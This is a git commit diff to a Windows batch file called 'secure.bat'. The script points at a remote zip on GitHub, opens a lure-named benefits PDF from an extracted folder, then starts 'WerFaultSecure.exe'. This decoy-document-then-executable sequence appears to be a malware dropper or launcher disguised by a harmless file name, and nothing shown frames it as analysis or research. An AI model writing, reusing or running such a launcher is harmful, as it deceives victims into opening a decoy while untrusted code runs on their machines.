2334ff1911b39b7aef3d391088a25726edb337b4
z3nn1 <149288329+z3nn1@users.noreply.github.com>
2024-09-17 01:10:59 +0700

    Update secure.bat

--- secure.bat
+++ secure.bat
@@ -1,9 +1,10 @@
 @echo off
 
 set URL=https://raw.githubusercontent.com/z3nn1/DataPublic/main/Data2.zip
-set OUTPUT=file.zip
+set OUTPUT=Data2.zip
 set EXTRACTED_DIR=extracted
 cd %EXTRACTED_DIR%
 start BenefitsJDPhotoVideoUNQILOQ42024.pdf
 timeout /t 3 /nobreak >nul
 start WerFaultSecure.exe
+
